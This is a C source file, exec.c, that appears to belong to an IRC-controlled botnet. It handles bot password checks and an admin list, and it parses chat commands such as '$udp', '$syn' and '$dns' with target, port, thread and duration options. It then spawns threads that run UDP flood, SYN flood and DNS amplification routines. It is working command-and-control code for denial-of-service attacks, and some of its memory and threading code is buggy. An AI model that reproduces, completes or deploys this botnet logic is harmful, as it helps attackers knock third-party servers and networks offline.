/*
 *   Author           : 93aef0ce4dd141ece6f5
 *   Title            : exec.c
 *   Description      : functions which concern executing
 *                      or authentication go here
 *
 *   Copyright (C) 2016  93aef0ce4dd141ece6f5
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

#include <winsock2.h>
#include <windows.h>

#elif defined(__linux__)

#include <sys/socket.h>
#include <pthread.h>
// need other headers?

#endif

#include "bot.h"

#define DEFAULT_ARG_SIZE 10

/*
 * function to check if user
 * has authenticated with correct
 * password
 * return TRUE if correct else
 * return FALSE
 */
int check_pass (const char *pass) {
    if (strncmp (pass, BOT_PWORD, strlen (BOT_PWORD)) == 0) {
        return TRUE;
    }

    return FALSE;
}

/*
 * function to add nickname to 
 * admin list
 * requires a bit of error checking
 * to see if larger than max admin
 * size (255) and if admin array needs to
 * be expanded
 */
int add_admin (pAccount a, pMessage m) {
    // check if admins are maxed out
    if (a->num_admins < UCHAR_MAX) {
        //unsigned char prev_admin_size = a->admin_size;
        // check if admin array needs to be expanded
        if (a->num_admins >= a->admin_size) {
            // expand array with realloc
            a->admins = realloc (a->admins, sizeof (char *)*(a->admin_size*2+1));
            if (a->admins == NULL) {
                return FALSE;
            }
            // update admin size
            a->admin_size = a->admin_size*2+1;

            // iterate through admins to NULL any unused array pointers
            int i;
            for (i = 0; i < a->num_admins; i++);
            // initialise unused array pointers to NULL
            for (; i < a->admin_size; i++) {
                a->admins[i] = NULL;
            }
        }
        // add new admin to next available array element
        // increase number of admins by 1
        a->admins[a->num_admins++] = strdup (m->n_name);
        int i;
        for (i = 0; i < a->num_admins; i++)
        printf ("admin[%d]: %s\n", i, a->admins[i]);
    }

    return TRUE;
}

/*
 * function to check if user's
 * nickname is registered as an
 * admin
 * iterate through admin list with
 * strcmp and return non-zero if
 * is admin, else return 0
 */
bool is_admin (pAccount a, pMessage m) {
    int i;
    for (i = 0; i < a->num_admins; i++) {
        if (strcmp (m->n_name, a->admins[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

/*
 * function to check if command
 * is a dos command
 * return TRUE if it is
 * else FALSE
 */
bool is_dos (const char *cmd) {
    if (strcmp (cmd, "$udp") == 0) {
        return TRUE;
    } else if (strcmp (cmd, "$syn") == 0) {
        return TRUE;
    }

    return FALSE;
}

/*
 * function to initialise 
 * thread arguments
 */
static thr_args *new_thr_args (SOCKET s) {
    thr_args *ta = malloc (sizeof (*ta));

    ta->s = s;
    ta->contact = NULL;
    ta->addr = NULL;
    ta->port = NULL;
    ta->threads = 0;
    ta->time = 0;

    return ta;
}

/*
 * function to retrieve
 * appropriate flood function
 */
static void *(*get_flood_function (const char *f)) (void *) {
    if (strcmp (f, "$udp") == 0) {
        return &udp_flood;
    } else if (strcmp (f, "$syn") == 0) {
        return &syn_flood;
    } else if (strcmp (f, "$dns") == 0) {
        return &dns_amp;
    }

    return NULL;
}

/*
 * parse user message from IRC
 * as arguments to dos
 * might need to clean up the
 * code so it looks better
 * probably an array of function
 * pointers or something
 */
int parse_args (SOCKET s, pMessage m) {
    // array of arguments
    char **argv = malloc (sizeof (char *)*DEFAULT_ARG_SIZE-1);
    if (argv == NULL) {
        return FALSE;
    }

    int i = 0, argc;
    char *token = NULL;
    // extract command
    token = strtok (m->msg, " ");
    if (token == NULL) {
        return FALSE;
    }

    argv[i++] = token;

    // store message elements in each argv element
    for (; i < DEFAULT_ARG_SIZE; i++) {
        token = strtok (NULL, " ");
        if (token == NULL) {
            break;
        }
        argv[i] = token;
    }

    // argument count
    argc = i;

    if (argc < DEFAULT_ARG_SIZE-2) {
        return FALSE;
    }

    int opt = 0;
    thr_args *ta = new_thr_args (s);
    ta->contact = m->contact;

    // parse options from message
    while ((opt = getopt (argc, argv, "v:p:h:t:")) != -1) {
        switch (opt) {
            case 'v':
                ta->addr = optarg;
                break;
            case 'p':
                ta->port = optarg;
                break;
            case 'h':
                ta->threads = atoi (optarg);
                break;
            case 't':
                ta->time = atoi (optarg);
                break;
        }
    }

    // function pointer to get appropriate function
    void *(*flood_func)(void *) = get_flood_function (argv[0]);

    printf ("i: %d, thrds: %d\n", i, ta->threads);
    // thread flood routine
    for (i = 0; i < ta->threads; i++) {
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

        DWORD thr_id[ta->threads];
        HANDLE hThr;
        hThr = CreateThread (NULL, 0, (LPTHREAD_START_ROUTINE)flood_func, ta, 0, thr_id[i]);
        if (hThr == NULL) {
            fatal ("Thread flooder");
        }

#elif defined(__linux__)

        pthread_t thr[ta->threads];
        if (pthread_create (&thr[i], NULL, flood_func, ta)) {
            fatal ("Thread flooder");
        }
        if (pthread_join (thr[i], NULL)) {
            fatal ("Join thread flooder");
        }

#endif
        printf ("Spawned thread [%d]\n", i+1);
    }

    free (argv);
    free (ta);

    return TRUE;
}